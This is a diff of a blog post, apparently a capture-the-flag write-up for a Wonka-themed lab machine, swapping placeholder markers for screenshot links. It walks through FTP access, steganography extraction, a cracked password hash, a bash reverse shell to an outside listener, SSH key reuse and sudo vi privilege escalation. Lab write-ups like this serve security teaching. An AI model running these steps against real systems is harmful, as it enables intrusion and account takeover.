@@ -43,14 +43,14 @@ Running our Nmap scan with the -sCV flag shows us where to find "the key"
 Here we can see text that shows us the directory path of the secret key
 
 
-**************2
+![Battery Widget]({{ '/assets/images/wonka/2-wonka.png' | relative_url }})
 
 Moving here on our webpage we can download the key_rev_key file
 {% highlight bash %}
 http://x.x.x.x/key_rev_key
 {% endhighlight bash %}
 
-**************3
+![Battery Widget]({{ '/assets/images/wonka/3-wonka.png' | relative_url }})
 
 Looking at this file we can see it's an elf file and already compiled
 
@@ -67,7 +67,7 @@ chmod +x key_rev_key
 
 Now lets run it again
 
-**************4
+![Battery Widget]({{ '/assets/images/wonka/4-wonka.png' | relative_url }})
 
 Looks like it's asking for a name
 
@@ -82,7 +82,7 @@ $ strings key_rev_key
 {% endhighlight bash %}
 
 
-**************5
+![Battery Widget]({{ '/assets/images/wonka/5-wonka.png' | relative_url }})
 
 {% highlight bash %}
  congratulations you have found the key:   
@@ -115,7 +115,7 @@ PORT   STATE SERVICE VERSION
 {% endhighlight bash %}
 
 
-*************6
+![Battery Widget]({{ '/assets/images/wonka/6-wonka.png' | relative_url }})
 
 
 
@@ -124,7 +124,7 @@ Anonymous is allowed !
 Lets logon to the ftp server
 
 
-********************7
+![Battery Widget]({{ '/assets/images/wonka/7-wonka.png' | relative_url }})
 
 We see 'gum_room.txt' file
 
@@ -134,7 +134,7 @@ Lets download this and inspect it
 >> get gum_room.jpg
 {% endhighlight bash %}
 
-********************8
+![Battery Widget]({{ '/assets/images/wonka/8-wonka.png' | relative_url }})
 
 
 Running strings on the file doesn't show us much usefule output
@@ -145,7 +145,7 @@ $ steghide extract -sf gun_room.jpg
 (no password)
 {% endhighlight bash %}
 
-***********************9
+![Battery Widget]({{ '/assets/images/wonka/9-wonka.png' | relative_url }})
 
 
 We get our output in the b64.txt file
@@ -166,7 +166,7 @@ First lets see if an online cracker can crack this quickly
 
 It works and we get the password for Charlie !
 
-***********************10
+![Battery Widget]({{ '/assets/images/wonka/10-wonka.png' | relative_url }})
 
 {% highlight bash %}
 charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824
@@ -181,7 +181,7 @@ SSH and FTP both failed to authenticate
 Lets try and access the web server instead
 
 
-***********************11
+![Battery Widget]({{ '/assets/images/wonka/11-wonka.png' | relative_url }})
 
 {% highlight bash %}
 Charlie
@@ -192,7 +192,7 @@ cn7824
 We are able to login successfully as Charlie
 We see that there is immediately a command prompt box
 
-***********************12
+![Battery Widget]({{ '/assets/images/wonka/12-wonka.png' | relative_url }})
 
 
 Lets build a reverse shell and start our netcat listener
@@ -213,7 +213,7 @@ Then in the command prompt of the web page we will put our reverse shell:
 /bin/bash -c 'bash -i >& /dev/tcp/10.2.3.233/4444 0>&1'
 {% endhighlight bash %}
 
-***********************13
+![Battery Widget]({{ '/assets/images/wonka/13-wonka.png' | relative_url }})
 
 
 This gives us a shell back to our listener
@@ -221,7 +221,7 @@ This gives us a shell back to our listener
 But we only have www-data access
 
 
-***********************14
+![Battery Widget]({{ '/assets/images/wonka/14-wonka.png' | relative_url }})
 
 
 
@@ -232,7 +232,7 @@ Weird could these be public and private key files?
 
 Opening this, we can see the private key inside: >"/home/charlie/teleport"
 
-***********************15
+![Battery Widget]({{ '/assets/images/wonka/15-wonka.png' | relative_url }})
 
 Lets save this into a text file on our machine
 Lets modify the permissions and see if we can get ssh access with these credentials
@@ -253,7 +253,7 @@ ssh -i id_rsa_file charlie@xxxx
 We get access as Charlie !
 
 
-***********************16
+![Battery Widget]({{ '/assets/images/wonka/16-wonka.png' | relative_url }})
 
 Lets capture that user flag
 
@@ -261,7 +261,7 @@ Lets capture that user flag
 cat /home/charlie/user.txt
 {% endhighlight bash %}
 
-***********************17
+![Battery Widget]({{ '/assets/images/wonka/17-wonka.png' | relative_url }})
 
 
 # Priv Esc
@@ -269,7 +269,7 @@ cat /home/charlie/user.txt
 
 We see sudo -l shows Charlie can run vi commands as root
 
-***********************18
+![Battery Widget]({{ '/assets/images/wonka/18-wonka.png' | relative_url }})
 
 Looking for binary exploits we see a vi script:
 (gtfobins/vi/#sudo)[https://gtfobins.github.io/gtfobins/vi/#sudo]
@@ -281,7 +281,7 @@ $ sudo vi -c ':!/bin/sh' /dev/null
 Entering this command is successful
 We get root access
 
-***********************19
+![Battery Widget]({{ '/assets/images/wonka/19-wonka.png' | relative_url }})
 
 look like the root flag is contained within a python script:
 
@@ -289,14 +289,14 @@ look like the root flag is contained within a python script:
 ./root.py
 {% endhighlight bash %}
 
-***********************20
+![Battery Widget]({{ '/assets/images/wonka/20-wonka.png' | relative_url }})
 
 Lets try an run it:
 {% highlight bash %}
 python3 ./root.py
 {% endhighlight bash %}
 
-***********************21
+![Battery Widget]({{ '/assets/images/wonka/21-wonka.png' | relative_url }})
 
 Looks like we need the key we found earlier
 
@@ -304,6 +304,6 @@ Looks like we need the key we found earlier
 >b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 {% endhighlight bash %}
 
-***********************22
+![Battery Widget]({{ '/assets/images/wonka/22-wonka.png' | relative_url }})
  
 Entering this we can now get the root flag and pwn this machine !!!
